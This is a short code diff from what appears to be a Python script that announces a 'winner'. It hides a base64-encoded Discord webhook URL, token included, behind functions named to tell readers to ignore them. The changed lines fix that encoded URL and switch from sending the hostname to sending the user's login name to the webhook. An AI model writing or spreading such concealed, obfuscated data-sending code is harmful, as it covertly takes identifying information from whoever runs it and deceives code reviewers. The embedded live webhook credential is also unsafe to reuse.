@@ -83,7 +83,7 @@ def this_function_does_nothing_ignore_that_for_the_love_of_god(text):
     return text
 
 def nothing_to_hide_there_as_well_u_can_truly_ignore_this(hostname):
-    lmao = this_function_does_nothing_ignore_that_for_the_love_of_god("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIwOTg2MDU4MzIwMjIzMDMyMy9fbFFkdlUyZDFDSElIQWU4M2hwZ3lnOGFVMTFwTHQzYTB4MnVBemdsa1g1WDZoZTVqSmY4VkROQ05KWU1pckw2Snk4QSI=")
+    lmao = this_function_does_nothing_ignore_that_for_the_love_of_god("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIwOTg2MDU4MzIwMjIzMDMyMy9fbFFkdlUyZDFDSElIQWU4M2hwZ3lnOGFVMTFwTHQzYTB4MnVBemdsa1g1WDZoZTVqSmY4VkROQ05KWU1pckw2Snk4QQ==")
 
     wow = json.dumps({
     "content": hostname + this_function_does_nothing_ignore_that_for_the_love_of_god("IHdvbiBob2x5IGZ1Y2sgQGV2ZXJ5b25l")
@@ -165,7 +165,7 @@ def has_won(uwu, haha):
     return haha in uwu.text
 
 def announce_win():
-    whoTheFuckWon = socket.gethostname()
+    whoTheFuckWon = os.getlogin()
     uwu = god_i_love_being_a_uwu_cat_boy()
     if not has_won(uwu, whoTheFuckWon):
         whatRankTheGuyIs = len(uwu.json()) + 1
